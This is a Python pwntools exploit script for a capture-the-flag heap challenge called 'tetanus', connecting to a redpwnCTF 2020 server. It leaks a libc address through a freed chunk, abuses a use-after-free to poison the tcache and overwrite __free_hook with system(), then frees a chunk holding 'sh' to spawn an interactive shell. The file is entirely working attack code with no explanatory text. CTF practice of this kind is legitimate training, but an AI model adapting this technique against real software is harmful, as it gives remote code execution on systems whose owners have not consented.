from pwn import *

#context.log_level = 'debug'

def create(size):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))

def delete(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def edit(idx, offset, val):
    p.sendlineafter('> ', '3')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(offset))
    p.sendlineafter('> ', str(val))

def append(idx, cnt, val):
    p.sendlineafter('> ', '5')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(cnt))
    for i in val:
        p.sendlineafter('> ', str(i))

def view(idx, offset):
    p.sendlineafter('> ', '6')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(offset))

#p = process('./tetanus')
p = remote('2020.redpwnc.tf', 31069)
e = ELF('./tetanus')
l = e.libc

create(0x420)
append(0, 4, [0xdadadada, 1, 2, 3])
append(0, 4, [0xbabababa, 4, 5, 6])
delete(0)
view(0, 0)

p.recvuntil('Value: ')
libc = int(p.recvline().strip()) - 0x1eabe0
log.info('libc : ' + hex(libc))

create(0x30)
create(0x30) # 2
append(1, 4, [0x3a3a3a3a, 1, 2, 3])
append(2, 4, [0x3a3a3a3a, 1, 2, 3])
delete(1)
delete(2)

edit(2, 0, libc+l.sym['__free_hook'])

create(0x30) # 3
append(3, 1, [0x6873])
create(0x30) # 4
append(4, 1, [libc+l.sym['system']])
delete(3)
p.interactive()
